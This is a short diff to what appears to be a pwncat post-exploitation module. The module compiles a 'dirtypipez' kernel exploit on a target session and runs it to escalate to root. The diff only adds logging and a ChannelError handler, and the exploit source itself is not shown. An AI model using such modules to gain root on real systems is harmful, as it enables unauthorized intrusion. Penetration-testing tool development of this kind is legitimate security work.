@@ -12,6 +12,7 @@ from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
 from pwncat.manager import Session
 from pwncat.platform.linux import Linux
 from pwncat.platform import PlatformError, Path
+from pwncat.channel import ChannelError
 
 def errcheck(result, func, args):
     if not result:
@@ -250,18 +251,22 @@ class Module(BaseModule):
 
         # Compile dirtypipez exploit binary
         try:
-            yield Status( "compiling dirtypipe exploit")
+            session.log("compiling dirtypipe exploit")            
+            yield Status("compiling dirtypipe exploit")
             rootshell = session.platform.compile(
                 [StringIO(dirtypipez_source)],
                 output=rootshell
             )
         except PlatformError as exc:
             raise ModuleFailed( f"compilation failed for dirtypipez exploit: {exc}") from exc
+        except ChannelError as channel_exc:
+            raise ModuleFailed( f"Channel error during compilation process: {channel_exc}") from channel_exc
         except Exception as exc2:
             raise ModuleFailed( f"General exception occured while building dirtypipez exploit: {exc2}") from exc2
 
         try:
-            yield Status( "attempting to privesc to [red]root[/red]")               
+            session.log( "executing dirtypipez exploit")                           
+            yield Status( "attempting to privesc to [red]root[/red]")
             proc = session.platform.Popen( 
                 [rootshell], 
                 stdin=subprocess.PIPE,
